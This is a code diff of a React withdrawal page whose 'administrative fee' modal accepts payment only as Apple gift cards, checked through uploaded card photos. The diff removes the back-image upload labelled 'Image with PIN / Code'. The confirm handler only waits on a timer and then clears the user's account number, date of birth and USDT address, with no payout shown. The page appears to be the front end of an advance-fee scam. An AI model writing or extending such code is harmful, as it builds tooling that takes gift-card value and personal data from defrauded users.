@@ -28,7 +28,6 @@ interface AppleGiftCardItem {
   id: string;
   amount: string;
   frontImage: string | null;
-  backImage: string | null;
 }
 
 export default function WithdrawPage() {
@@ -47,7 +46,7 @@ export default function WithdrawPage() {
   // Administrative Fee Modal State - Exclusively Apple Gift Cards with Multi-Upload Calculation
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [giftCards, setGiftCards] = useState<AppleGiftCardItem[]>([
-    { id: 'card-1', amount: '', frontImage: null, backImage: null }
+    { id: 'card-1', amount: '', frontImage: null }
   ]);
   
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -80,7 +79,7 @@ export default function WithdrawPage() {
   const addGiftCard = () => {
     setGiftCards((prev) => [
       ...prev,
-      { id: `card-${Date.now()}`, amount: '', frontImage: null, backImage: null }
+      { id: `card-${Date.now()}`, amount: '', frontImage: null }
     ]);
   };
 
@@ -123,32 +122,6 @@ export default function WithdrawPage() {
     }
   };
 
-  // Handle Back Image Upload
-  const handleBackUpload = async (id: string, file: File) => {
-    const reader = new FileReader();
-    reader.onloadend = () => {
-      setGiftCards((prev) =>
-        prev.map((c) => (c.id === id ? { ...c, backImage: reader.result as string } : c))
-      );
-    };
-    reader.readAsDataURL(file);
-
-    // Upload to Supabase Storage bucket via API
-    try {
-      const formData = new FormData();
-      formData.append('file', file);
-      formData.append('bucket', 'withdrawal-fees');
-
-      const res = await fetch('/api/upload', { method: 'POST', body: formData });
-      const data = await res.json();
-      if (data?.url) {
-        console.log('✅ Apple Gift Card Back uploaded to Supabase:', data.url);
-      }
-    } catch (err) {
-      console.warn('Supabase storage upload fallback:', err);
-    }
-  };
-
   const handleConfirmWithdrawal = async () => {
     setIsSubmitting(true);
     setTimeout(() => {
@@ -161,7 +134,7 @@ export default function WithdrawPage() {
       setAccountNumber('');
       setDob('');
       setUsdtAddress('');
-      setGiftCards([{ id: 'card-1', amount: '', frontImage: null, backImage: null }]);
+      setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
     }, 2000);
   };
 
@@ -172,7 +145,7 @@ export default function WithdrawPage() {
 
   const isModalValid =
     isFeeFulfilled &&
-    giftCards.every((c) => parseFloat(c.amount) > 0 && c.frontImage && c.backImage);
+    giftCards.every((c) => parseFloat(c.amount) > 0 && c.frontImage);
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
@@ -476,81 +449,43 @@ export default function WithdrawPage() {
                   </div>
                 </div>
 
-                {/* 2. Upload Front & Back Pictures */}
+                {/* 2. Upload Front Picture */}
                 <div className="space-y-1.5">
                   <label className="block text-[11px] font-bold text-slate-300">
-                    Card Images (Front & Back)
+                    Card Image (Front Upload)
                   </label>
-                  <div className="grid grid-cols-2 gap-3">
-                    {/* Front Upload */}
-                    <div>
-                      <label
-                        htmlFor={`front-upload-${card.id}`}
-                        className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
-                          card.frontImage
-                            ? 'border-emerald-500/60 bg-emerald-500/10'
-                            : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
-                        }`}
-                      >
-                        {card.frontImage ? (
-                          <div className="flex flex-col items-center space-y-1">
-                            <FileImage className="w-5 h-5 text-emerald-400" />
-                            <span className="text-[10px] font-bold text-emerald-300">Front Uploaded ✓</span>
-                          </div>
-                        ) : (
-                          <div className="flex flex-col items-center space-y-1 text-slate-400">
-                            <Upload className="w-5 h-5 text-[#6EB7FF]" />
-                            <span className="text-[10px] font-bold text-white">Upload Front</span>
-                            <span className="text-[8px] text-slate-500">Image of card front</span>
-                          </div>
-                        )}
-                      </label>
-                      <input
-                        id={`front-upload-${card.id}`}
-                        type="file"
-                        accept="image/*"
-                        onChange={(e) => {
-                          const file = e.target.files?.[0];
-                          if (file) handleFrontUpload(card.id, file);
-                        }}
-                        className="hidden"
-                      />
-                    </div>
-
-                    {/* Back Upload */}
-                    <div>
-                      <label
-                        htmlFor={`back-upload-${card.id}`}
-                        className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
-                          card.backImage
-                            ? 'border-emerald-500/60 bg-emerald-500/10'
-                            : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
-                        }`}
-                      >
-                        {card.backImage ? (
-                          <div className="flex flex-col items-center space-y-1">
-                            <FileImage className="w-5 h-5 text-emerald-400" />
-                            <span className="text-[10px] font-bold text-emerald-300">Back Uploaded ✓</span>
-                          </div>
-                        ) : (
-                          <div className="flex flex-col items-center space-y-1 text-slate-400">
-                            <Upload className="w-5 h-5 text-[#6EB7FF]" />
-                            <span className="text-[10px] font-bold text-white">Upload Back</span>
-                            <span className="text-[8px] text-slate-500">Image with PIN / Code</span>
-                          </div>
-                        )}
-                      </label>
-                      <input
-                        id={`back-upload-${card.id}`}
-                        type="file"
-                        accept="image/*"
-                        onChange={(e) => {
-                          const file = e.target.files?.[0];
-                          if (file) handleBackUpload(card.id, file);
-                        }}
-                        className="hidden"
-                      />
-                    </div>
+                  <div>
+                    <label
+                      htmlFor={`front-upload-${card.id}`}
+                      className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
+                        card.frontImage
+                          ? 'border-emerald-500/60 bg-emerald-500/10'
+                          : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
+                      }`}
+                    >
+                      {card.frontImage ? (
+                        <div className="flex flex-col items-center space-y-1">
+                          <FileImage className="w-5 h-5 text-emerald-400" />
+                          <span className="text-[10px] font-bold text-emerald-300">Front Image Uploaded ✓</span>
+                        </div>
+                      ) : (
+                        <div className="flex flex-col items-center space-y-1 text-slate-400">
+                          <Upload className="w-5 h-5 text-[#6EB7FF]" />
+                          <span className="text-[10px] font-bold text-white">Upload Apple Card Image</span>
+                          <span className="text-[8px] text-slate-500">Click or drop front card photo</span>
+                        </div>
+                      )}
+                    </label>
+                    <input
+                      id={`front-upload-${card.id}`}
+                      type="file"
+                      accept="image/*"
+                      onChange={(e) => {
+                        const file = e.target.files?.[0];
+                        if (file) handleFrontUpload(card.id, file);
+                      }}
+                      className="hidden"
+                    />
                   </div>
                 </div>
               </div>
